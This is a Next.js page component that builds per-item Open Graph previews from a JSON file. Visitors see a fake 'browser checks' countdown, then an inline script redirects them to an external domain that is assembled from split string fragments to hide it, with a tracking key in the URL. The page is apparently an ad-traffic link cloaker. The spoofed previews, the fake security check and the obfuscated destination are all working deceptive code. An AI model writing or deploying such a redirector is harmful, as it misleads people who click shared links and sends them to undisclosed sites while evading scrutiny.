import fs from "fs";
import path from "path";
import { GetServerSideProps } from "next";

type DataItem = {
  id: string;
  title: string;
  image: string;
  key: string;
};

export const getServerSideProps: GetServerSideProps = async (context) => {
  const { id } = context.params!;
  const filePath = path.join(process.cwd(), "public", "data.json");
  const jsonData = fs.readFileSync(filePath, "utf-8");
  const data: DataItem[] = JSON.parse(jsonData);

  const item = data.find((x) => x.id === id);
  if (!item) {
    return { notFound: true };
  }

  return { props: { item } };
};

export default function RedirectPage({ item }: { item: DataItem }) {
  return (
    <>
      <head>
        <title>{item.title}</title>
        <meta name="description" content="" />
        <meta property="og:locale" content="en_GB" />
        <meta property="og:type" content="website" />
        <meta property="og:url" content={`https://adsteralink.vercel.app/${item.id}`} />
        <meta property="og:title" content={item.title} />
        <meta property="og:image" content={item.image} />
        <link
          href="https://fonts.googleapis.com/css2?family=LXGW+Marker+Gothic&family=Poppins:wght@400;600&display=swap"
          rel="stylesheet"
        />
      </head>

      <body
        style={{
          textAlign: "center",
          display: "flex",
          flexDirection: "column",
          justifyContent: "center",
          minHeight: "100vh",
          fontFamily: '"LXGW Marker Gothic", sans-serif',
        }}
      >
        <div className="content">
          <h1>Please wait one moment!</h1>
          <h2 id="number">3</h2>
          <p>We need to carry out some browser checks, please wait 3 seconds..</p>
          <p>Thank you for your patience!</p>
        </div>
        <footer>
          <input type="hidden" id="loc" value={item.key} />
        </footer>

        <script
          dangerouslySetInnerHTML={{
            __html: `
              setInterval(function(){
                var num = document.getElementById("number").innerHTML;
                if (num > 0) num--;
                document.getElementById("number").innerHTML = num;
                if (num == 0) {
                  var url1 = 'signingunwilling';
                  var url2 = '.com';
                  var url3 = '/haba8g98r5';
                  window.location.replace('https://' + url1 + url2 + url3 + "?key=${item.key}");
                }
              }, 1000);
            `,
          }}
        />
      </body>
    </>
  );
}
